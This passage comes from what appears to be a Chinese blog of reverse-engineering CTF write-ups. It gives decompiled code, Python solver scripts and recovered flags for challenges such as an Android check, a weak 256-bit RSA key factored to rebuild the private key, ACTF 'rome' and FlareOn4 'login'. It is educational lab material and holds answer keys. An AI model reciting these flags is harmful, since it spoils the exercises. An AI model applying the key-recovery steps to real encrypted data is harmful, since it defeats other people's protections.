class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">ActionBarActivity</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MainActivity</span><span class="params">()</span> {</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle arg8)</span> {</span><br><span class="line">        <span class="built_in">super</span>.onCreate(arg8);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F030018</span>);</span><br><span class="line">        <span class="built_in">this</span>.findViewById(<span class="number">0x7F05003D</span>).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View$OnClickListener</span>(<span class="keyword">new</span> <span class="title class_">char</span>[]{<span class="string">'T'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'s'</span>, <span class="string">'I'</span>, <span class="string">'s'</span>, <span class="string">'T'</span>, <span class="string">'h'</span>, <span class="string">'e'</span>, <span class="string">'F'</span>, <span class="string">'l'</span>, <span class="string">'a'</span>, <span class="string">'g'</span>, <span class="string">'H'</span>, <span class="string">'o'</span>, <span class="string">'m'</span>, <span class="string">'e'</span>}, <span class="built_in">this</span>.findViewById(<span class="number">0x7F05003E</span>), <span class="keyword">new</span> <span class="title class_">char</span>[]{<span class="string">'p'</span>, <span class="string">'v'</span>, <span class="string">'k'</span>, <span class="string">'q'</span>, <span class="string">'{'</span>, <span class="string">'m'</span>, <span class="string">'1'</span>, <span class="string">'6'</span>, <span class="string">'4'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'5'</span>, <span class="string">'2'</span>, <span class="string">'6'</span>, <span class="string">'2'</span>, <span class="string">'0'</span>, <span class="string">'3'</span>, <span class="string">'3'</span>, <span class="string">'l'</span>, <span class="string">'4'</span>, <span class="string">'m'</span>, <span class="string">'4'</span>, <span class="string">'9'</span>, <span class="string">'l'</span>, <span class="string">'n'</span>, <span class="string">'p'</span>, <span class="string">'7'</span>, <span class="string">'p'</span>, <span class="string">'9'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'k'</span>, <span class="string">'2'</span>, <span class="string">'8'</span>, <span class="string">'k'</span>, <span class="string">'7'</span>, <span class="string">'5'</span>, <span class="string">'}'</span>}, <span class="built_in">this</span>.findViewById(<span class="number">0x7F05003F</span>)) {</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View arg13)</span> {</span><br><span class="line">                <span class="type">int</span> <span class="variable">v11</span> <span class="operator">=</span> <span class="number">17</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">v10</span> <span class="operator">=</span> <span class="number">0x7A</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">v9</span> <span class="operator">=</span> <span class="number">90</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">v8</span> <span class="operator">=</span> <span class="number">65</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">v7</span> <span class="operator">=</span> <span class="number">97</span>;</span><br><span class="line">                <span class="type">char</span>[] v3 = <span class="keyword">new</span> <span class="title class_">char</span>[v11];</span><br><span class="line">                <span class="type">char</span>[] v4 = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">38</span>];</span><br><span class="line">                <span class="type">int</span> v0;</span><br><span class="line">                <span class="keyword">for</span>(v0 = <span class="number">0</span>; v0 &lt; v11; ++v0) {</span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">this</span>.val$a[v0] &gt;= <span class="number">73</span> || <span class="built_in">this</span>.val$a[v0] &lt; v8) {</span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">this</span>.val$a[v0] &lt; <span class="number">105</span> &amp;&amp; <span class="built_in">this</span>.val$a[v0] &gt;= v7) {</span><br><span class="line">                        label_39:</span><br><span class="line">                            v3[v0] = ((<span class="type">char</span>)(<span class="built_in">this</span>.val$a[v0] + <span class="number">18</span>));</span><br><span class="line">                            goto label_44;</span><br><span class="line">                        }</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">this</span>.val$a[v0] &gt;= v8 &amp;&amp; <span class="built_in">this</span>.val$a[v0] &lt;= v9 || <span class="built_in">this</span>.val$a[v0] &gt;= v7 &amp;&amp; <span class="built_in">this</span>.val$a[v0] &lt;= v10) {</span><br><span class="line">                            v3[v0] = ((<span class="type">char</span>)(<span class="built_in">this</span>.val$a[v0] - <span class="number">8</span>));</span><br><span class="line">                            goto label_44;</span><br><span class="line">                        }</span><br><span class="line"></span><br><span class="line">                        v3[v0] = <span class="built_in">this</span>.val$a[v0];</span><br><span class="line">                    }</span><br><span class="line">                    <span class="keyword">else</span> {</span><br><span class="line">                        goto label_39;</span><br><span class="line">                    }</span><br><span class="line"></span><br><span class="line">                label_44:</span><br><span class="line">                }</span><br></pre></td></tr></tbody></table></figure><p>在第17行发现类似flag的字符，利用python转为连贯的字符串</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag=[<span class="string">'p'</span>, <span class="string">'v'</span>, <span class="string">'k'</span>, <span class="string">'q'</span>, <span class="string">'{'</span>, <span class="string">'m'</span>, <span class="string">'1'</span>, <span class="string">'6'</span>, <span class="string">'4'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'5'</span>, <span class="string">'2'</span>, <span class="string">'6'</span>, <span class="string">'2'</span>, <span class="string">'0'</span>, <span class="string">'3'</span>, <span class="string">'3'</span>, <span class="string">'l'</span>, <span class="string">'4'</span>, <span class="string">'m'</span>, <span class="string">'4'</span>, <span class="string">'9'</span>, <span class="string">'l'</span>, <span class="string">'n'</span>, <span class="string">'p'</span>, <span class="string">'7'</span>, <span class="string">'p'</span>, <span class="string">'9'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'k'</span>, <span class="string">'2'</span>, <span class="string">'8'</span>, <span class="string">'k'</span>, <span class="string">'7'</span>, <span class="string">'5'</span>, <span class="string">'}'</span>]</span><br><span class="line">flag=<span class="string">''</span>.join(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>得到<code>pvkq{m164675262033l4m49lnp7p9mnk28k75}</code>，猜测可能经过了凯撒加密，利用在线工具得到<code>flag{c164675262033b4c49bdf7f9cda28a75}</code></p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220906193246304.png" alt="image-20220906193246304"><figcaption aria-hidden="true">image-20220906193246304</figcaption></figure><h3 id="rsa">19.rsa</h3><p>参考：https://www.cnblogs.com/Nickyl07/p/12670317.html</p><p>根据题目名称可知，本题考查的是RSA算法，首先将附件里的公钥进行解析（<a href="http://www.hiencode.com/pub_asys.html">在线工具</a>），解析结果如下：</p><blockquote><p>密钥类型：RSA</p><p>密钥强度：256</p><p>PN(e)：65537(十进制)</p><p>PN(n)：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">86934482296048119190666062003494800588905656017203025617216654058378322103517</span><br></pre></td></tr></tbody></table></figure><p>DER格式：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">303c300d06092a864886f70d0101010500032b003028022100c0332c5c64ae47182f6c1c876d42336910545a58f7eefefc0bcaaf5af341ccdd0203010001</span><br></pre></td></tr></tbody></table></figure></blockquote><p>利用<a href="http://factordb.com/index.php?">在线工具</a>分解 n，得到</p><blockquote><p>p = 285960468890451637935629440372639283459</p><p>q = 304008741604601924494328155975272418463</p></blockquote><p>通过下面的脚本解得flag</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line">p = <span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q = <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line"></span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过已知条件，生成私钥，并解密密文</span></span><br><span class="line">private_key = rsa.PrivateKey(n, e, d, p, q)<span class="comment">#生成私钥</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"C:/Users/19594/Desktop/flag.enc"</span>,<span class="string">"rb+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = rsa.decrypt(f.read(), private_key)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p><code>flag{decrypt_256}</code></p><h3 id="actf新生赛2020rome">20.[ACTF新生赛2020]rome</h3><p>首先解压文件</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220913214655907.png" alt="image-20220913214655907"><figcaption aria-hidden="true">image-20220913214655907</figcaption></figure><p>利用exeinfoPE查看文件架构</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220913214801996.png" alt="image-20220913214801996"><figcaption aria-hidden="true">image-20220913214801996</figcaption></figure><p>用IDA打开文件，直接F5查看伪代码：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  __main();</span><br><span class="line">  func();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>双击查看<code>_main()</code>函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __main()</span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !initialized )</span><br><span class="line">  {</span><br><span class="line">    initialized = <span class="number">1</span>;</span><br><span class="line">    result = __do_global_ctors();</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>再查看<code>func()</code>函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+14h] [ebp-44h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+18h] [ebp-40h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+1Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+20h] [ebp-38h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// [esp+24h] [ebp-34h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v6; <span class="comment">// [esp+25h] [ebp-33h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v7; <span class="comment">// [esp+26h] [ebp-32h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v8; <span class="comment">// [esp+27h] [ebp-31h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v9; <span class="comment">// [esp+28h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+29h] [ebp-2Fh]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+2Dh] [ebp-2Bh]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+31h] [ebp-27h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+35h] [ebp-23h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v14; <span class="comment">// [esp+39h] [ebp-1Fh]</span></span><br><span class="line">  <span class="type">char</span> v15; <span class="comment">// [esp+3Bh] [ebp-1Dh]</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [esp+3Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [esp+3Dh] [ebp-1Bh]</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// [esp+3Eh] [ebp-1Ah]</span></span><br><span class="line">  <span class="type">char</span> v19; <span class="comment">// [esp+3Fh] [ebp-19h]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [esp+40h] [ebp-18h]</span></span><br><span class="line">  <span class="type">char</span> v21; <span class="comment">// [esp+41h] [ebp-17h]</span></span><br><span class="line">  <span class="type">char</span> v22; <span class="comment">// [esp+42h] [ebp-16h]</span></span><br><span class="line">  <span class="type">char</span> v23; <span class="comment">// [esp+43h] [ebp-15h]</span></span><br><span class="line">  <span class="type">char</span> v24; <span class="comment">// [esp+44h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> v25; <span class="comment">// [esp+45h] [ebp-13h]</span></span><br><span class="line">  <span class="type">char</span> v26; <span class="comment">// [esp+46h] [ebp-12h]</span></span><br><span class="line">  <span class="type">char</span> v27; <span class="comment">// [esp+47h] [ebp-11h]</span></span><br><span class="line">  <span class="type">char</span> v28; <span class="comment">// [esp+48h] [ebp-10h]</span></span><br><span class="line">  <span class="type">char</span> v29; <span class="comment">// [esp+49h] [ebp-Fh]</span></span><br><span class="line">  <span class="type">char</span> v30; <span class="comment">// [esp+4Ah] [ebp-Eh]</span></span><br><span class="line">  <span class="type">char</span> v31; <span class="comment">// [esp+4Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v15 = <span class="number">81</span>;</span><br><span class="line">  v16 = <span class="number">115</span>;</span><br><span class="line">  v17 = <span class="number">119</span>;</span><br><span class="line">  v18 = <span class="number">51</span>;</span><br><span class="line">  v19 = <span class="number">115</span>;</span><br><span class="line">  v20 = <span class="number">106</span>;</span><br><span class="line">  v21 = <span class="number">95</span>;</span><br><span class="line">  v22 = <span class="number">108</span>;</span><br><span class="line">  v23 = <span class="number">122</span>;</span><br><span class="line">  v24 = <span class="number">52</span>;</span><br><span class="line">  v25 = <span class="number">95</span>;</span><br><span class="line">  v26 = <span class="number">85</span>;</span><br><span class="line">  v27 = <span class="number">106</span>;</span><br><span class="line">  v28 = <span class="number">119</span>;</span><br><span class="line">  v29 = <span class="number">64</span>;</span><br><span class="line">  v30 = <span class="number">108</span>;</span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;v5);</span><br><span class="line">  result = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">65</span> )</span><br><span class="line">  {</span><br><span class="line">    result = v6;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">67</span> )</span><br><span class="line">    {</span><br><span class="line">      result = v7;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="number">84</span> )</span><br><span class="line">      {</span><br><span class="line">        result = v8;</span><br><span class="line">        <span class="keyword">if</span> ( v8 == <span class="number">70</span> )</span><br><span class="line">        {</span><br><span class="line">          result = v9;</span><br><span class="line">          <span class="keyword">if</span> ( v9 == <span class="number">123</span> )</span><br><span class="line">          {</span><br><span class="line">            result = v14;</span><br><span class="line">            <span class="keyword">if</span> ( v14 == <span class="number">125</span> )</span><br><span class="line">            {</span><br><span class="line">              v1 = v10;</span><br><span class="line">              v2 = v11;</span><br><span class="line">              v3 = v12;</span><br><span class="line">              v4 = v13;</span><br><span class="line">              <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">              {</span><br><span class="line">                <span class="keyword">if</span> ( *((_BYTE *)&amp;v1 + i) &gt; <span class="number">64</span> &amp;&amp; *((_BYTE *)&amp;v1 + i) &lt;= <span class="number">90</span> )</span><br><span class="line">                  *((_BYTE *)&amp;v1 + i) = (*((<span class="type">char</span> *)&amp;v1 + i) - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">                <span class="keyword">if</span> ( *((_BYTE *)&amp;v1 + i) &gt; <span class="number">96</span> &amp;&amp; *((_BYTE *)&amp;v1 + i) &lt;= <span class="number">122</span> )</span><br><span class="line">                  *((_BYTE *)&amp;v1 + i) = (*((<span class="type">char</span> *)&amp;v1 + i) - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">              }</span><br><span class="line">              <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">              {</span><br><span class="line">                result = (<span class="type">unsigned</span> __int8)*(&amp;v15 + i);</span><br><span class="line">                <span class="keyword">if</span> ( *((_BYTE *)&amp;v1 + i) != (_BYTE)result )</span><br><span class="line">                  <span class="keyword">return</span> result;</span><br><span class="line">              }</span><br><span class="line">              result = <span class="built_in">printf</span>(<span class="string">"You are correct!"</span>);</span><br><span class="line">            }</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>通过分析代码写出脚本，这里我不会对取模进行逆运算，就直接暴力求解</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">'Qsw3sj_lz4_Ujw@l'</span></span><br><span class="line">s=<span class="built_in">list</span>(s)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        x=j</span><br><span class="line">        <span class="keyword">if</span> j&gt;<span class="number">64</span> <span class="keyword">and</span> j&lt;=<span class="number">90</span>:</span><br><span class="line">            j = (j-<span class="number">51</span>)%<span class="number">26</span>+<span class="number">65</span></span><br><span class="line">        <span class="keyword">if</span> j&gt;<span class="number">96</span> <span class="keyword">and</span> j&lt;=<span class="number">122</span>:</span><br><span class="line">            j = (j-<span class="number">79</span>)%<span class="number">26</span>+<span class="number">97</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(j)==s[i]:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(x)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p><code>flag{Cae3ar_th4_Gre@t}</code></p><h3 id="flareon4login">21.[FlareOn4]login</h3><p>下载附件后，发现共两个文件，一个 txt 文件，一个 html 文件，双击打开html 文件，看不出什么，于是按F12，查看网页代码</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"prompt"</span>).<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">                <span class="keyword">var</span> flag = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"flag"</span>).<span class="property">value</span>;</span><br><span class="line">                <span class="keyword">var</span> rotFlag = flag.<span class="title function_">replace</span>(<span class="regexp">/[a-zA-Z]/g</span>, <span class="keyword">function</span>(<span class="params">c</span>){<span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((c &lt;= <span class="string">"Z"</span> ? <span class="number">90</span> : <span class="number">122</span>) &gt;= (c = c.<span class="title function_">charCodeAt</span>(<span class="number">0</span>) + <span class="number">13</span>) ? c : c - <span class="number">26</span>);});</span><br><span class="line">                <span class="title function_">alert</span>(rotFlag);<span class="keyword">if</span> (<span class="string">"PyvragFvqrYbtvafNerRnfl@syner-ba.pbz"</span> == rotFlag) {</span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">"Correct flag!"</span>);</span><br><span class="line">                } <span class="keyword">else</span> {</span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">"Incorrect flag, rot again"</span>);</span><br><span class="line">                }</span><br><span class="line">            }</span><br></pre></td></tr></tbody></table></figure><p>本来想要逆向分析代码，但是怎么也写不对脚本，后来参考网上的wp，发现是<code>ROT13</code>加密</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220913220646105.png" alt="image-20220913220646105"><figcaption aria-hidden="true">image-20220913220646105</figcaption></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rot13</span>(<span class="params">message</span>):</span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> message:</span><br><span class="line">        <span class="keyword">if</span>  (item &gt;= <span class="string">'A'</span> <span class="keyword">and</span> item &lt;= <span class="string">'M'</span>) <span class="keyword">or</span> (item &gt;= <span class="string">'a'</span> <span class="keyword">and</span> item &lt;= <span class="string">'m'</span>):</span><br><span class="line">            res += <span class="built_in">chr</span>(<span class="built_in">ord</span>(item)+<span class="number">13</span>)</span><br><span class="line">        <span class="keyword">elif</span>  (item &gt;= <span class="string">'N'</span> <span class="keyword">and</span> item &lt;= <span class="string">'Z'</span>) <span class="keyword">or</span> (item &gt;= <span class="string">'n'</span> <span class="keyword">and</span> item &lt;= <span class="string">'z'</span>):</span><br><span class="line">            res += <span class="built_in">chr</span>(<span class="built_in">ord</span>(item)-<span class="number">13</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res += item</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">s = <span class="string">'PyvragFvqrYbtvafNerRnfl@syner-ba.pbz'</span>   </span><br><span class="line"><span class="built_in">print</span> (rot13(s))           <span class="comment">#参考：https://www.jianshu.com/p/18794a1533b2</span></span><br></pre></td></tr></tbody></table></figure><p><code>flag{ClientSideLoginsAreEasy@flare-on.com}</code></p><h3 id="crackrtf">22.CrackRTF</h3><p>参考：https://www.52pojie.cn/thread-994588-1-1.html</p><h2 id="cftshow">cftshow</h2><h3 id="逆向签到题">1.逆向签到题</h3><p>将文件拖进IDA中，得到flag。</p><h2 id="攻防世界">攻防世界</h2><h3 id="game">1.game</h3><p>用IDA打开文件 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/c2f5d121af2b4f0e83b5ad0a56b2ed7b.png" alt="在这里插入图片描述">双击“_main_0”进入该函数中，发现一些字符串，按F5查看伪代码 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/8ff18d19eb6e43149aa2ce03d611e2ad.png" alt="在这里插入图片描述"> <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/63c37f5e1dc04387b8108e0ecacf3143.png" alt="在这里插入图片描述"> 发现最终会进入sub_457AB4中，双击进入该函数<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/51ed2f780e61456b8fea5d8cd5ea1eec.png" alt="在这里插入图片描述"> 再次双击sub_45E940函数 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/db11f50a22ce467c89f1ed07efc32667.png" alt="在这里插入图片描述">（注：如果IDA不能正确的获得自定义函数的名字，那么IDA会用sub__加上自定义函数的起始地址来定义函数的名字）发现有两组数组进行了异或运算，通过伪代码编写脚本</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">18</span>,<span class="number">64</span>,<span class="number">98</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">48</span>,<span class="number">49</span>,<span class="number">65</span>,<span class="number">32</span>,<span class="number">12</span>,<span class="number">48</span>,<span class="number">65</span>,<span class="number">31</span>,<span class="number">78</span>,<span class="number">62</span>,</span><br><span class="line"><span class="number">32</span>,<span class="number">49</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">57</span>,<span class="number">96</span>,<span class="number">3</span>,<span class="number">21</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">62</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">44</span>,<span class="number">65</span>,<span class="number">78</span>,<span class="number">32</span>,<span class="number">16</span>,</span><br><span class="line"><span 